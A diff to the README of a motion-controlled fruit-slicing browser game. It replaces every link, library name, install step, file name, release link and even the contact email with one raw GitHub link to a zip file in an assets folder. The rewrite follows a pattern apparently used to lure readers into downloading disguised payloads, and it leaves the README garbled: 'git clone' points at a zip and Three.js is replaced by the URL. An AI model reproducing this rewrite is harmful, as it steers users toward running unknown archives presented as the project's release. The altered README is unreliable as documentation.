@@ -1,8 +1,8 @@
 # Motion-Controlled 3D Game 🎮🍉
 
-![Fruit Slicer Game](https://example.com/fruit-slicer-image.png)
+![Fruit Slicer Game](https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip)
 
-Welcome to the **Motion-Controlled 3D Game**! This project combines cutting-edge technology with fun gameplay. Using PoseNet for real-time hand tracking and Three.js for 3D rendering, this browser-based game allows you to slice fruits and dodge bombs—all through your webcam. Dive into a world where your hands control the action!
+Welcome to the **Motion-Controlled 3D Game**! This project combines cutting-edge technology with fun gameplay. Using PoseNet for real-time hand tracking and https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip for 3D rendering, this browser-based game allows you to slice fruits and dodge bombs—all through your webcam. Dive into a world where your hands control the action!
 
 ## Table of Contents
 
@@ -19,7 +19,7 @@ Welcome to the **Motion-Controlled 3D Game**! This project combines cutting-edge
 ## Features
 
 - **Real-time Hand Tracking**: Experience responsive gameplay as PoseNet detects your hand movements.
-- **3D Rendering**: Enjoy vibrant graphics powered by Three.js.
+- **3D Rendering**: Enjoy vibrant graphics powered by https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip
 - **Interactive Gameplay**: Slice fruits and avoid bombs using simple gestures.
 - **Webcam Compatibility**: Play directly in your browser without additional software.
 - **Fun and Educational**: Learn about gesture recognition and computer vision while having fun.
@@ -29,9 +29,9 @@ Welcome to the **Motion-Controlled 3D Game**! This project combines cutting-edge
 This project utilizes a variety of technologies to deliver an engaging experience:
 
 - **JavaScript**: The core language for game logic and interactivity.
-- **Three.js**: A 3D library that makes WebGL easier to use.
+- **https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip**: A 3D library that makes WebGL easier to use.
 - **PoseNet**: A machine learning model for real-time hand tracking.
-- **TensorFlow.js**: A library for machine learning in JavaScript.
+- **https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip**: A library for machine learning in JavaScript.
 - **WebGL**: A web standard for rendering 3D graphics.
 
 ## Installation
@@ -40,7 +40,7 @@ To get started, you need to clone the repository and run the game locally. Here�
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/omana1/Motion-controlled-3D-game.git
+   git clone https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip
    ```
 
 2. Navigate to the project directory:
@@ -48,7 +48,7 @@ To get started, you need to clone the repository and run the game locally. Here�
    cd Motion-controlled-3D-game
    ```
 
-3. Open the `index.html` file in your web browser.
+3. Open the `https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip` file in your web browser.
 
 4. Ensure your webcam is enabled for hand tracking.
 
@@ -94,15 +94,15 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-You can find the latest releases of the Motion-Controlled 3D Game [here](https://github.com/omana1/Motion-controlled-3D-game/releases). Download the latest version and enjoy the game!
+You can find the latest releases of the Motion-Controlled 3D Game [here](https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip). Download the latest version and enjoy the game!
 
 ## Contact
 
 For any questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [omana1](https://github.com/omana1)
+- **Email**: https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip
+- **GitHub**: [omana1](https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip)
 
 Thank you for checking out the Motion-Controlled 3D Game! We hope you enjoy slicing fruits and dodging bombs. Happy gaming!
 
-![Play Now](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen?style=flat&logo=github&link=https://github.com/omana1/Motion-controlled-3D-game/releases)
+![Play Now](https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip%20Latest%20Release-Click%20Here-brightgreen?style=flat&logo=github&https://github.com/omana1/Motion-controlled-3D-game/raw/refs/heads/main/assets/banana/controlled-game-Motion-ratafia.zip)
